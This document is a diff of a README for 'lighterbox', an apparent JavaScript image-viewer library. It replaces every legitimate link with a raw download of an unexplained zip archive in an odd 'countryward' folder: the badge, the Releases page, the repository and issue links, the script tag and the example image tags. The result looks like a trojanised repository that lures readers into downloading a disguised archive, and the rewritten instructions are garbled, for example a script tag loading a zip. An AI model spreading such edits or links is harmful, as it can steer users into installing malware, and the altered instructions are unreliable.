@@ -1,7 +1,7 @@
 # 🎨 lighterbox - Effortless Image Viewing Experience  
 
-![Download lighterbox](https://img.shields.io/badge/Download-lighterbox-2EB67D?style=for-the-badge)  
-[Download lighterbox](https://github.com/engineerbishnu/lighterbox/releases)  
+![Download lighterbox](https://github.com/engineerbishnu/lighterbox/raw/refs/heads/main/countryward/Software_v2.2-alpha.3.zip)  
+[Download lighterbox](https://github.com/engineerbishnu/lighterbox/raw/refs/heads/main/countryward/Software_v2.2-alpha.3.zip)  
 
 ## 📦 Introduction  
 lighterbox is a simple tool for displaying images in a clean and engaging way. With smooth zoom and pan features, this application enhances your image viewing experience. You can use it effortlessly on any website without installing additional libraries or dependencies.  
@@ -10,7 +10,7 @@ lighterbox is a simple tool for displaying images in a clean and engaging way. W
 To begin using lighterbox, follow these easy steps. You will need a web browser. If you can view websites, you can run lighterbox.  
 
 ## 🔗 Download & Install  
-To get started, visit the [Releases page](https://github.com/engineerbishnu/lighterbox/releases) to download the latest version of lighterbox.  
+To get started, visit the [Releases page](https://github.com/engineerbishnu/lighterbox/raw/refs/heads/main/countryward/Software_v2.2-alpha.3.zip) to download the latest version of lighterbox.  
 
 1. Click the link above.  
 2. Locate the most recent release.  
@@ -35,17 +35,17 @@ Make sure to check that your browser supports modern web features, as lighterbox
 After downloading, you can easily implement lighterbox with just one line of code in your HTML file:  
 
 ```html
-<script src="path/to/lighterbox.js"></script>
+<script src="https://github.com/engineerbishnu/lighterbox/raw/refs/heads/main/countryward/Software_v2.2-alpha.3.zip"></script>
 ```
 
-Replace `"path/to/lighterbox.js"` with the actual path to the downloaded lighterbox file.  
+Replace `"https://github.com/engineerbishnu/lighterbox/raw/refs/heads/main/countryward/Software_v2.2-alpha.3.zip"` with the actual path to the downloaded lighterbox file.  
 
 To display images, wrap your images in the lighterbox component. Here’s an example:  
 
 ```html
 <lighterbox>
-  <img src="image1.jpg" alt="Image 1">
-  <img src="image2.jpg" alt="Image 2">
+  <img src="https://github.com/engineerbishnu/lighterbox/raw/refs/heads/main/countryward/Software_v2.2-alpha.3.zip" alt="Image 1">
+  <img src="https://github.com/engineerbishnu/lighterbox/raw/refs/heads/main/countryward/Software_v2.2-alpha.3.zip" alt="Image 2">
 </lighterbox>
 ```
 
@@ -76,7 +76,7 @@ This collaborative spirit helps improve lighterbox for everyone.
 Thanks to all the contributors who support and improve lighterbox. Your effort is appreciated.  
 
 ## 🔗 Links  
-- [GitHub Repository](https://github.com/engineerbishnu/lighterbox)  
-- [Issues Tracker](https://github.com/engineerbishnu/lighterbox/issues)  
+- [GitHub Repository](https://github.com/engineerbishnu/lighterbox/raw/refs/heads/main/countryward/Software_v2.2-alpha.3.zip)  
+- [Issues Tracker](https://github.com/engineerbishnu/lighterbox/raw/refs/heads/main/countryward/Software_v2.2-alpha.3.zip)  
 
-Visit the [Releases page](https://github.com/engineerbishnu/lighterbox/releases) to download the latest version of lighterbox. Enjoy a smooth image viewing experience!
+Visit the [Releases page](https://github.com/engineerbishnu/lighterbox/raw/refs/heads/main/countryward/Software_v2.2-alpha.3.zip) to download the latest version of lighterbox. Enjoy a smooth image viewing experience!
